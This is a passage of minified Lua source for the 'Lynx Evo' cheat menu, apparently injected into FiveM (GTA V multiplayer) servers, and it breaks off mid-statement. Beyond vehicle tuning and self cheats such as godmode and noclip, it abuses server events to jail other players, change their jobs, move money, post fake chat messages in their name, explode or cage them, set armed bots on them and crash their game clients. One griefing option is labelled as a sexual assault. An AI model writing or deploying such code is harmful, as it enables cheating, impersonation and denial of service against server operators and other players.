while bv do ped=PlayerPedId()veh=GetVehiclePedIsUsing(ped)SetVehicleModKit(veh,0)for i,dD in pairs(bk)do if LynxEvo.IsMenuOpened('tunings')then if bf then if bh=='neon'then local r,g,b=table.unpack(bg)SetVehicleNeonLightsColour(veh,r,g,b)SetVehicleNeonLightEnabled(veh,0,bj)SetVehicleNeonLightEnabled(veh,1,bj)SetVehicleNeonLightEnabled(veh,2,bj)SetVehicleNeonLightEnabled(veh,3,bj)bf=false

bh=-1

bg=-1 elseif bh=='paint'then local dE,dF,dG,dH=table.unpack(bg)SetVehicleColours(veh,dE,dF)SetVehicleExtraColours(veh,dG,dH)bf=false

bh=-1

bg=-1 else if bj=='rm'then RemoveVehicleMod(veh,bh)bf=false

bh=-1

bg=-1 else SetVehicleMod(veh,bh,bg,false)bf=false

bh=-1

bg=-1 end end end end

if LynxEvo.IsMenuOpened(dD.id)then if dD.id=='wheeltypes'then if LynxEvo.Button('Sport Wheels')then SetVehicleWheelType(veh,0)elseif LynxEvo.Button('Muscle Wheels')then SetVehicleWheelType(veh,1)elseif LynxEvo.Button('Lowrider Wheels')then SetVehicleWheelType(veh,2)elseif LynxEvo.Button('SUV Wheels')then SetVehicleWheelType(veh,3)elseif LynxEvo.Button('Offroad Wheels')then SetVehicleWheelType(veh,4)elseif LynxEvo.Button('Tuner Wheels')then SetVehicleWheelType(veh,5)elseif LynxEvo.Button('High End Wheels')then SetVehicleWheelType(veh,7)end

LynxEvo.Display()elseif dD.id=='extra'then local dI=checkValidVehicleExtras()for i,dD in pairs(dI)do if IsVehicleExtraTurnedOn(veh,i)then pricestring='Installed'else pricestring='Not Installed'end

if LynxEvo.Button(dD.menuName,pricestring)then SetVehicleExtra(veh,i,IsVehicleExtraTurnedOn(veh,i))end end

LynxEvo.Display()elseif dD.id=='headlight'then if LynxEvo.Button('None')then SetVehicleHeadlightsColour(veh,-1)end

for dJ,dD in pairs(bn)do tp=GetVehicleHeadlightsColour(veh)if tp==dD.id and not bf then pricetext='Installed'else if bf and tp==dD.id then pricetext='Previewing'else pricetext='Not Installed'end end

head=GetVehicleHeadlightsColour(veh)if LynxEvo.Button(dD.name,pricetext)then if not bf then bh='headlight'bj=false

oldhead=GetVehicleHeadlightsColour(veh)bg=table.pack(oldhead)SetVehicleHeadlightsColour(veh,dD.id)bf=true elseif bf and head==dD.id then ToggleVehicleMod(veh,22,true)SetVehicleHeadlightsColour(veh,dD.id)bf=false

bh=-1

bg=-1 elseif bf and head~=dD.id then SetVehicleHeadlightsColour(veh,dD.id)bf=true end end end

LynxEvo.Display()elseif dD.id=='licence'then if LynxEvo.Button('None')then SetVehicleNumberPlateTextIndex(veh,3)end

for dJ,dD in pairs(bm)do tp=GetVehicleNumberPlateTextIndex(veh)if tp==dD.id and not bf then pricetext='Installed'else if bf and tp==dD.id then pricetext='Previewing'else pricetext='Not Installed'end end

plate=GetVehicleNumberPlateTextIndex(veh)if LynxEvo.Button(dD.name,pricetext)then if not bf then bh='headlight'bj=false

oldhead=GetVehicleNumberPlateTextIndex(veh)bg=table.pack(oldhead)SetVehicleNumberPlateTextIndex(veh,dD.id)bf=true elseif bf and plate==dD.id then SetVehicleNumberPlateTextIndex(veh,dD.id)bf=false

bh=-1

bg=-1 elseif bf and plate~=dD.id then SetVehicleNumberPlateTextIndex(veh,dD.id)bf=true end end end

LynxEvo.Display()elseif dD.id=='neon'then if LynxEvo.Button('None')then SetVehicleNeonLightsColour(veh,255,255,255)SetVehicleNeonLightEnabled(veh,0,false)SetVehicleNeonLightEnabled(veh,1,false)SetVehicleNeonLightEnabled(veh,2,false)SetVehicleNeonLightEnabled(veh,3,false)end

for i,dD in pairs(bp)do colorr,colorg,colorb=table.unpack(dD)r,g,b=GetVehicleNeonLightsColour(veh)if colorr==r and colorg==g and colorb==b and IsVehicleNeonLightEnabled(vehicle,2)and not bf then pricestring='Installed'else if bf and colorr==r and colorg==g and colorb==b then pricestring='Previewing'else pricestring='Not Installed'end end

if LynxEvo.Button(i,pricestring)then if not bf then bh='neon'bj=IsVehicleNeonLightEnabled(veh,1)oldr,oldg,oldb=GetVehicleNeonLightsColour(veh)bg=table.pack(oldr,oldg,oldb)SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)SetVehicleNeonLightEnabled(veh,0,true)SetVehicleNeonLightEnabled(veh,1,true)SetVehicleNeonLightEnabled(veh,2,true)SetVehicleNeonLightEnabled(veh,3,true)bf=true elseif bf and colorr==r and colorg==g and colorb==b then SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)SetVehicleNeonLightEnabled(veh,0,true)SetVehicleNeonLightEnabled(veh,1,true)SetVehicleNeonLightEnabled(veh,2,true)SetVehicleNeonLightEnabled(veh,3,true)bf=false

bh=-1

bg=-1 elseif bf and colorr~=r or colorg~=g or colorb~=b then SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)SetVehicleNeonLightEnabled(veh,0,true)SetVehicleNeonLightEnabled(veh,1,true)SetVehicleNeonLightEnabled(veh,2,true)SetVehicleNeonLightEnabled(veh,3,true)bf=true end end end

LynxEvo.Display()elseif dD.id=='paint'then if LynxEvo.MenuButton('~h~~p~#~s~ Primary Paint','primary')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Secondary Paint','secondary')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Wheel Paint','rimpaint')then end

LynxEvo.Display()else local ay=checkValidVehicleMods(dD.id)for i,dK in pairs(ay)do for dL,dM in pairs(bo)do if dL==dD.name and GetVehicleMod(veh,dD.id)~=dK.data.realIndex then price='Not Installed'elseif dL==dD.name and bf and GetVehicleMod(veh,dD.id)==dK.data.realIndex then price='Previewing'elseif dL==dD.name and GetVehicleMod(veh,dD.id)==dK.data.realIndex then price='Installed'end end

if dK.menuName=='~h~~b~Stock'then end

if dD.name=='Horns'then for dN,dO in pairs(bo)do if dO==ci-1 then dK.menuName=dN end end end

if dK.menuName=='NULL'then dK.menuName='unknown'end

if LynxEvo.Button(dK.menuName)then if not bf then bh=dD.id

bg=GetVehicleMod(veh,dD.id)bf=true

if dK.data.realIndex==-1 then bj='rm'RemoveVehicleMod(veh,dK.data.modid)bf=false

bh=-1

bg=-1

bj=false else bj=false

SetVehicleMod(veh,dD.id,dK.data.realIndex,false)end elseif bf and GetVehicleMod(veh,dD.id)==dK.data.realIndex then bf=false

bh=-1

bg=-1

bj=false

if dK.data.realIndex==-1 then RemoveVehicleMod(veh,dK.data.modid)else SetVehicleMod(veh,dD.id,dK.data.realIndex,false)end elseif bf and GetVehicleMod(veh,dD.id)~=dK.data.realIndex then if dK.data.realIndex==-1 then RemoveVehicleMod(veh,dK.data.modid)bf=false

bh=-1

bg=-1

bj=false else SetVehicleMod(veh,dD.id,dK.data.realIndex,false)bf=true end end end end

LynxEvo.Display()end end end

for i,dD in pairs(bl)do if LynxEvo.IsMenuOpened(dD.id)then if GetVehicleMod(veh,dD.id)==0 then pricestock='Not Installed'price1='Installed'price2='Not Installed'price3='Not Installed'price4='Not Installed'elseif GetVehicleMod(veh,dD.id)==1 then pricestock='Not Installed'price1='Not Installed'price2='Installed'price3='Not Installed'price4='Not Installed'elseif GetVehicleMod(veh,dD.id)==2 then pricestock='Not Installed'price1='Not Installed'price2='Not Installed'price3='Installed'price4='Not Installed'elseif GetVehicleMod(veh,dD.id)==3 then pricestock='Not Installed'price1='Not Installed'price2='Not Installed'price3='Not Installed'price4='Installed'elseif GetVehicleMod(veh,dD.id)==-1 then pricestock='Installed'price1='Not Installed'price2='Not Installed'price3='Not Installed'price4='Not Installed'end

if LynxEvo.Button('Stock '..dD.name,pricestock)then SetVehicleMod(veh,dD.id,-1)elseif LynxEvo.Button(dD.name..' Upgrade 1',price1)then SetVehicleMod(veh,dD.id,0)elseif LynxEvo.Button(dD.name..' Upgrade 2',price2)then SetVehicleMod(veh,dD.id,1)elseif LynxEvo.Button(dD.name..' Upgrade 3',price3)then SetVehicleMod(veh,dD.id,2)elseif dD.id~=13 and dD.id~=12 and LynxEvo.Button(dD.name..' Upgrade 4',price4)then SetVehicleMod(veh,dD.id,3)end

LynxEvo.Display()end end

if LynxEvo.IsMenuOpened('LynxX')then local dP=PlayerId(-1)local bG=GetPlayerName(dP)au('~h~Lynx ~o~Official ~b~8R4 ~p~#~s~'..bG,false)au('~b~https://~s~www.lynxmenu.com~b~/',false)if LynxEvo.MenuButton('~h~~p~#~s~ Self Menu','SelfMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Online Players','OnlinePlayerMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Teleport Menu','TeleportMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle Menu','VehicleMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Weapon Menu','WeaponMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Lua Menu ~o~~h~:3','LuaMenu')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Advanced Mode ~o~~h~xD','AdvM')then elseif LynxEvo.MenuButton('~h~~p~# ~y~34ByTe Community','crds')then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('SelfMenu')then if LynxEvo.CheckBox('~h~~g~Godmode',Godmode,function(dQ)Godmode=dQ end)then elseif LynxEvo.Button('~h~~y~Semi ~g~Godmode')then local dR='stt_prop_stunt_soccer_ball'while not HasModelLoaded(GetHashKey(dR))do Citizen.Wait(0)RequestModel(GetHashKey(dR))end

local dS=CreateObject(GetHashKey(dR),0,0,0,true,true,false)SetEntityVisible(dS,0,0)AttachEntityToEntity(dS,GetPlayerPed(-1),GetPedBoneIndex(GetPlayerPed(-1),57005),0,0,-1.0,0,0,0,false,true,true,true,1,true)elseif LynxEvo.CheckBox('~h~~g~Player Visible',d3,function(dQ)d3=dQ end)then elseif LynxEvo.Button('~h~~r~Suicide')then SetEntityHealth(PlayerPedId(-1),0)elseif LynxEvo.Button('~h~~g~ESX~s~ Revive Yourself~s~')then TriggerEvent('esx_ambulancejob:revive')elseif LynxEvo.Button('~h~~g~Heal/Revive')then SetEntityHealth(PlayerPedId(-1),200)elseif LynxEvo.Button('~h~~b~Give Armour')then SetPedArmour(PlayerPedId(-1),200)elseif LynxEvo.CheckBox('~h~Infinite Stamina',InfStamina,function(dQ)InfStamina=dQ end)then elseif LynxEvo.CheckBox('~h~Thermal ~o~Vision',bTherm,function(bTherm)end)then therm=not therm

bTherm=therm

SetSeethrough(therm)elseif LynxEvo.CheckBox('~h~Fast Run',fastrun,function(dQ)fastrun=dQ end)then elseif LynxEvo.CheckBox('~h~Super Jump',SuperJump,function(dQ)SuperJump=dQ end)then elseif LynxEvo.CheckBox('~h~Noclip',Noclip,function(dQ)Noclip=dQ end)then end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('OnlinePlayerMenu')then for i=0,128 do if NetworkIsPlayerActive(i)and GetPlayerServerId(i)~=0 and LynxEvo.MenuButton(GetPlayerName(i)..' ~p~['..GetPlayerServerId(i)..']~s~ ~y~['..i..']~s~ '..(IsPedDeadOrDying(GetPlayerPed(i),1)and'~h~~r~DEAD'or'~h~~g~ALIVE'),'PlayerOptionsMenu')then SelectedPlayer=i end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('PlayerOptionsMenu')then LynxEvo.SetSubTitle('PlayerOptionsMenu','Player Options ['..GetPlayerName(SelectedPlayer)..']')if LynxEvo.MenuButton('~h~~p~#~s~ ESX Triggers','ESXTriggerini')then elseif LynxEvo.MenuButton('~h~~p~#~s~ ESX Jobs','ESXJobs2')then elseif LynxEvo.MenuButton('~h~~p~#~s~ VRP Triggers','VRPPlayerTriggers')then elseif LynxEvo.MenuButton('~h~~p~#~s~ Troll Menu','Trollmenu')then elseif LynxEvo.Button('~h~Spectate',cB and'~g~[SPECTATING]')then SpectatePlayer(SelectedPlayer)elseif LynxEvo.Button('~h~~r~Semi GOD ~s~Player')then local dR='stt_prop_stunt_soccer_ball'while not HasModelLoaded(GetHashKey(dR))do Citizen.Wait(0)RequestModel(GetHashKey(dR))end

local dS=CreateObject(GetHashKey(dR),0,0,0,true,true,false)SetEntityVisible(dS,0,0)AttachEntityToEntity(dS,GetPlayerPed(SelectedPlayer),GetPedBoneIndex(GetPlayerPed(SelectedPlayer),57005),0,0,-1.0,0,0,0,false,true,true,true,1,true)elseif LynxEvo.Button('~h~~g~Heal ~s~Player')then local dT='PICKUP_HEALTH_STANDARD'local dU=GetHashKey(dT)local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))CreateAmbientPickup(dU,bJ.x,bJ.y,bJ.z+1.0,1,1,dU,1,0)SetPickupRegenerationTime(pickup,60)elseif LynxEvo.Button('~h~~b~Armour ~s~Player')then local dV='PICKUP_ARMOUR_STANDARD'local dW=GetHashKey(dV)local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))local pickup=CreateAmbientPickup(dW,bJ.x,bJ.y,bJ.z+1.0,1,1,dW,1,0)SetPickupRegenerationTime(pickup,60)elseif LynxEvo.Button('~h~~b~FULL Armour ~s~Player')then local dV='PICKUP_ARMOUR_STANDARD'local dW=GetHashKey(dV)local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))for i=0,99 do Citizen.Wait(0)CreateAmbientPickup(dW,bJ.x,bJ.y,bJ.z+1.0,1,1,dW,1,0)SetPickupRegenerationTime(pickup,10)i=i+1 end elseif LynxEvo.Button('~h~Teleport To')then if cN then local confirm=KeyboardInput('Are you sure? y/n','',0)if confirm=='y'then local Entity=IsPedInAnyVehicle(PlayerPedId(-1),false)and GetVehiclePedIsUsing(PlayerPedId(-1))or PlayerPedId(-1)SetEntityCoords(Entity,GetEntityCoords(GetPlayerPed(SelectedPlayer)),0.0,0.0,0.0,false)elseif confirm=='n'then au('~h~~b~Operation cancelled~s~.',false)else au('~h~~b~Invalid Confirmation~s~.',true)au('~h~~b~Operation cancelled~s~.',false)end else local Entity=IsPedInAnyVehicle(PlayerPedId(-1),false)and GetVehiclePedIsUsing(PlayerPedId(-1))or PlayerPedId(-1)SetEntityCoords(Entity,GetEntityCoords(GetPlayerPed(SelectedPlayer)),0.0,0.0,0.0,false)end elseif LynxEvo.CheckBox('~h~Freeze Player',freezeplayer,function(dQ)freezeplayer=dQ end)then elseif LynxEvo.MenuButton('~h~~p~#~s~ Give Single Weapon','GiveSingleWeaponPlayer')then elseif LynxEvo.Button('~h~Give ~r~All Weapons')then for i=1,#b5 do GiveWeaponToPed(GetPlayerPed(SelectedPlayer),GetHashKey(b5[i]),1000,false,false)end elseif LynxEvo.Button('~h~Remove ~r~All Weapons')then RemoveAllPedWeapons(PlayerPedId(SelectedPlayer),true)elseif LynxEvo.Button('~h~Give ~r~Vehicle')then local ped=GetPlayerPed(SelectedPlayer)local ca=KeyboardInput('Enter Vehicle Spawn Name','',100)if ca and IsModelValid(ca)and IsModelAVehicle(ca)then RequestModel(ca)while not HasModelLoaded(ca)do Citizen.Wait(0)end

local veh=CreateVehicle(GetHashKey(ca),GetEntityCoords(ped),GetEntityHeading(ped)+90,true,true)else au('~b~Model is not valid!',true)end elseif LynxEvo.Button('~h~Send To ~r~Jail')then TriggerServerEvent('esx-qalle-jail:jailPlayer',GetPlayerServerId(selectedPlayer),5000,'Jailed')TriggerServerEvent('esx_jailer:sendToJail',GetPlayerServerId(selectedPlayer),45*60)TriggerServerEvent('esx_jail:sendToJail',GetPlayerServerId(selectedPlayer),45*60)TriggerServerEvent('js:jailuser',GetPlayerServerId(selectedPlayer),45*60,'Jailed')elseif LynxEvo.Button('~h~~g~Evade ~s~From Jail')then local dX=SelectedPlayer

TriggerServerEvent('esx-qalle-jail:jailPlayer',GetPlayerServerId(dX),0,'escaperino')TriggerServerEvent('esx_jailer:sendToJail',GetPlayerServerId(dX),0)TriggerServerEvent('esx_jail:sendToJail',GetPlayerServerId(dX),0)TriggerServerEvent('js:jailuser',GetPlayerServerId(dX),0,'escaperino')end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXTriggerini')then if LynxEvo.Button('~h~~g~Revive Player')then local aw=GetPlayerPed(SelectedPlayer)local bJ=GetEntityCoords(aw)TriggerServerEvent('esx_ambulancejob:setDeathStatus',false)local dY={x=ESX.Math.Round(bJ.x,1),y=ESX.Math.Round(bJ.y,1),z=ESX.Math.Round(bJ.z,1)}RespawnPed(aw,dY,0.0)StopScreenEffect('DeathFailOut')DoScreenFadeIn(800)elseif LynxEvo.Button('~h~~g~Give money to player from your wallet')then local k=KeyboardInput('Enter amount of money to give','',100)if k~=''then TriggerServerEvent('esx:giveInventoryItem',GetPlayerServerId(SelectedPlayer),'item_money','money',k)end elseif LynxEvo.Button('~h~~b~Handcuff Player')then TriggerServerEvent('esx_policejob:handcuff',GetPlayerServerId(SelectedPlayer))end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('VRPPlayerTriggers')then if LynxEvo.Button('~h~Transfer money from your bank')then local dZ=KeyboardInput('Enter amount of money to give','',100)local d_=KeyboardInput('Enter VRP PERMA ID!','',100)if dZ~=''then local dh=GetPlayerServerId(PlayerId())TriggerEvent('bank:transfer',dh,GetPlayerServerId(SelectedPlayer),dZ)TriggerServerEvent('bank:transfer',d_,dZ)end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('ESXJobs2')then if LynxEvo.Button('~h~Set Unemployed')then TriggerServerEvent('NB:destituerplayer',GetPlayerServerId(SelectedPlayer))UnemployedPlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~b~Police ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'police',3)PolicePlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~o~Mecano ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'mecano',3)MecanoPlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~y~Taxi ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'taxi',3)TaxiPlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~r~Ambulance ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'ambulance',3)AmbulancePlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~g~Real Estate ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'realestateagent',3)RealEstateAgentPlayer(SelectedPlayer)elseif LynxEvo.Button('~h~Set ~r~Car ~b~Dealer ~s~Job')then TriggerServerEvent('NB:recruterplayer',GetPlayerServerId(SelectedPlayer),'cardealer',3)CarDealerPlayer(SelectedPlayer)end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('Trollmenu')then if LynxEvo.MenuButton('~h~~p~#~s~ Spawn Peds','SpawnPeds')then elseif LynxEvo.Button('~h~~r~Fake ~s~Chat Message')then local e0=KeyboardInput('Enter message to send','',100)local e1=GetPlayerName(SelectedPlayer)if e0 then TriggerServerEvent('_chat:messageEntered',e1,{0,0x99,255},e0)end elseif LynxEvo.Button('~h~~r~Kick ~s~From Vehicle')then ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))elseif LynxEvo.Button('~h~~y~Explode ~s~Vehicle')then if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer),true)then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)),4,1337.0,false,true,0.0)else au('~h~~b~Player not in a vehicle~s~.',false)end elseif LynxEvo.Button('~h~~r~Launch ~s~his car')then if GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer),false)~=0 then local e2=GetEntityCoords(GetPlayerPed(SelectedPlayer))local e3=GetEntityHeading(GetPlayerPed(SelectedPlayer))local e4=CreatePed(5,68070371,e2,e3,true)local e5=CreateVehicle(GetHashKey('adder'),e2,e3,true,false)SetPedIntoVehicle(e4,e5,-1)else au('~h~~b~Player not in a vehicle~s~.',false)end elseif LynxEvo.Button('~h~~r~Banana ~p~Party')then local bG=CreateObject(GetHashKey('p_crahsed_heli_s'),0,0,0,true,true,true)local bH=CreateObject(GetHashKey('prop_rock_4_big2'),0,0,0,true,true,true)local bI=CreateObject(GetHashKey('prop_beachflag_le'),0,0,0,true,true,true)AttachEntityToEntity(bG,GetPlayerPed(SelectedPlayer),GetPedBoneIndex(GetPlayerPed(SelectedPlayer),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)AttachEntityToEntity(bH,GetPlayerPed(SelectedPlayer),GetPedBoneIndex(GetPlayerPed(SelectedPlayer),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)AttachEntityToEntity(bI,GetPlayerPed(SelectedPlayer),GetPedBoneIndex(GetPlayerPed(SelectedPlayer),57005),0.4,0,0,0,270.0,60.0,true,true,false,true,1,true)elseif LynxEvo.Button('~h~~r~Explode')then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)),5,3000.0,true,false,100000.0)AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)),5,3000.0,true,false,true)elseif LynxEvo.Button('~h~~r~Rape')then RequestModelSync('a_m_o_acult_01')RequestAnimDict('rcmpaparazzo_2')while not HasAnimDictLoaded('rcmpaparazzo_2')do Citizen.Wait(0)end

if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer),true)then local veh=GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer),true)while not NetworkHasControlOfEntity(veh)do NetworkRequestControlOfEntity(veh)Citizen.Wait(0)end

SetEntityAsMissionEntity(veh,true,true)DeleteVehicle(veh)DeleteEntity(veh)end

count=-0.2

for b=1,3 do local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer),true))local bR=CreatePed(4,GetHashKey('a_m_o_acult_01'),x,y,z,0.0,true,false)SetEntityAsMissionEntity(bR,true,true)AttachEntityToEntity(bR,GetPlayerPed(SelectedPlayer),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)ClearPedTasks(GetPlayerPed(SelectedPlayer))TaskPlayAnim(GetPlayerPed(SelectedPlayer),'rcmpaparazzo_2','shag_loop_poppy',2.0,2.5,-1,49,0,0,0,0)SetPedKeepTask(bR)TaskPlayAnim(bR,'rcmpaparazzo_2','shag_loop_a',2.0,2.5,-1,49,0,0,0,0)SetEntityInvincible(bR,true)count=count-0.4 end elseif LynxEvo.Button('~h~~r~Cage ~s~Player')then x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))roundx=tonumber(string.format('%.2f',x))roundy=tonumber(string.format('%.2f',y))roundz=tonumber(string.format('%.2f',z))local e6='prop_fnclink_05crnr1'local e7=GetHashKey(e6)RequestModel(e7)while not HasModelLoaded(e7)do Citizen.Wait(0)end

local e8=CreateObject(e7,roundx-1.70,roundy-1.70,roundz-1.0,true,true,false)local e9=CreateObject(e7,roundx+1.70,roundy+1.70,roundz-1.0,true,true,false)SetEntityHeading(e8,-90.0)SetEntityHeading(e9,90.0)FreezeEntityPosition(e8,true)FreezeEntityPosition(e9,true)elseif LynxEvo.Button('~h~~r~Hamburgher ~s~Player')then local ea='xs_prop_hamburgher_wl'local eb=GetHashKey(ea)local ec=CreateObject(eb,0,0,0,true,true,true)AttachEntityToEntity(ec,GetPlayerPed(SelectedPlayer),GetPedBoneIndex(GetPlayerPed(SelectedPlayer),0),0,0,-1.0,0.0,0.0,0,true,true,false,true,1,true)elseif LynxEvo.Button('~h~~r~Hamburgher ~s~Player Car')then local ea='xs_prop_hamburgher_wl'local eb=GetHashKey(ea)local ec=CreateObject(eb,0,0,0,true,true,true)AttachEntityToEntity(ec,GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer),false),GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer),false),'chassis'),0,0,-1.0,0.0,0.0,0,true,true,false,true,1,true)elseif LynxEvo.Button('~h~~r~Snowball troll ~s~Player')then j=true

x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))roundx=tonumber(string.format('%.2f',x))roundy=tonumber(string.format('%.2f',y))roundz=tonumber(string.format('%.2f',z))local ed='sr_prop_spec_tube_xxs_01a'local ee=GetHashKey(ed)RequestModel(ee)RequestModel(smashhash)while not HasModelLoaded(ee)do Citizen.Wait(0)end

local ef=CreateObject(ee,roundx,roundy,roundz-5.0,true,true,false)SetEntityRotation(ef,0.0,90.0,0.0)local eg=-356333586

local bQ='WEAPON_SNOWBALL'for i=0,10 do local bJ=GetEntityCoords(ef)RequestModel(eg)Citizen.Wait(50)if HasModelLoaded(eg)then local ped=CreatePed(21,eg,bJ.x+math.sin(i*2.0),bJ.y-math.sin(i*2.0),bJ.z-5.0,0,true,true)and CreatePed(21,eg,bJ.x-math.sin(i*2.0),bJ.y+math.sin(i*2.0),bJ.z-5.0,0,true,true)NetworkRegisterEntityAsNetworked(ped)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then local eh=PedToNet(ped)NetworkSetNetworkIdDynamic(eh,false)SetNetworkIdCanMigrate(eh,true)SetNetworkIdExistsOnAllMachines(eh,true)Citizen.Wait(500)NetToPed(eh)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetCurrentPedWeapon(ped,GetHashKey(bQ),true)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end elseif LynxEvo.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_')then local ei=GetEntityCoords(GetPlayerPed(SelectedPlayer))local ej={0x9CF21E0F,0x34315488,0x6A27FEB1,0xCB2ACC8,0xC6899CDE,0xD14B5BA3,0xD9F4474C,0x32A9996C,0x69D4F974,0xCAFC1EC3,0x79B41171,0x1075651,0xC07792D4,0x781E451D,0x762657C6,0xC2E75A21,0xC3C00861,0x81FB3FF0,0x45EF7804,0xE65EC0E4,0xE764D794,0xFBF7D21F,0xE1AEB708,0xA5E3D471,0xD971BBAE,0xCF7A9A9D,0xC2CC99D8,0x8FB233A4,0x24E08E1F,0x337B2B54,0xB9402F87,0x4F2526DA}for i=1,#ej do local c=CreateObject(ej[i],ei,true,true,true)end end

LynxEvo.Display()elseif LynxEvo.IsMenuOpened('SpawnPeds')then if LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~AK')then local bP='s_m_y_swat_01'local bQ='WEAPON_ASSAULTRIFLE'for i=0,10 do local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))RequestModel(GetHashKey(bP))Citizen.Wait(50)if HasModelLoaded(GetHashKey(bP))then local ped=CreatePed(21,GetHashKey(bP),bJ.x+i,bJ.y-i,bJ.z,0,true,true)and CreatePed(21,GetHashKey(bP),bJ.x-i,bJ.y+i,bJ.z,0,true,true)NetworkRegisterEntityAsNetworked(ped)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then local eh=PedToNet(ped)NetworkSetNetworkIdDynamic(eh,false)SetNetworkIdCanMigrate(eh,true)SetNetworkIdExistsOnAllMachines(eh,true)Citizen.Wait(500)NetToPed(eh)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~RPG')then local bP='s_m_y_swat_01'local bQ='weapon_rpg'for i=0,10 do local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))RequestModel(GetHashKey(bP))Citizen.Wait(50)if HasModelLoaded(GetHashKey(bP))then local ped=CreatePed(21,GetHashKey(bP),bJ.x+i,bJ.y-i,bJ.z,0,true,true)and CreatePed(21,GetHashKey(bP),bJ.x-i,bJ.y+i,bJ.z,0,true,true)NetworkRegisterEntityAsNetworked(ped)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then local eh=PedToNet(ped)NetworkSetNetworkIdDynamic(eh,false)SetNetworkIdCanMigrate(eh,true)SetNetworkIdExistsOnAllMachines(eh,true)Citizen.Wait(500)NetToPed(eh)GiveWeaponToPed(ped,GetHashKey(bQ),9999,1,1)SetEntityInvincible(ped,true)SetPedCanSwitchWeapon(ped,true)TaskCombatPed(ped,GetPlayerPed(SelectedPlayer),0,16)elseif IsEntityDead(GetPlayerPed(SelectedPlayer))then TaskCombatHatedTargetsInArea(ped,bJ.x,bJ.y,bJ.z,500)else Citizen.Wait(0)end end end elseif LynxEvo.Button('~h~~r~Spawn ~s~Swat army with ~y~Flaregun')then local bP='s_m_y_swat_01'local bQ='weapon_flaregun'for i=0,10 do local bJ=GetEntityCoords(GetPlayerPed(SelectedPlayer))RequestModel(GetHashKey(bP))Citizen.Wait(50)if HasModelLoaded(GetHashKey(bP))then local ped=CreatePed(21,GetHashKey(bP),bJ.x+i,bJ.y-i,bJ.z,0,true,true)and CreatePed(21,GetHashKey(bP),bJ.x-i,bJ.y+i,bJ.z,0,true,true)NetworkRegisterEntityAsNetworked(ped)if DoesEntityExist(ped)and not IsEntityDead(GetPlayerPed(SelectedPlayer))then local 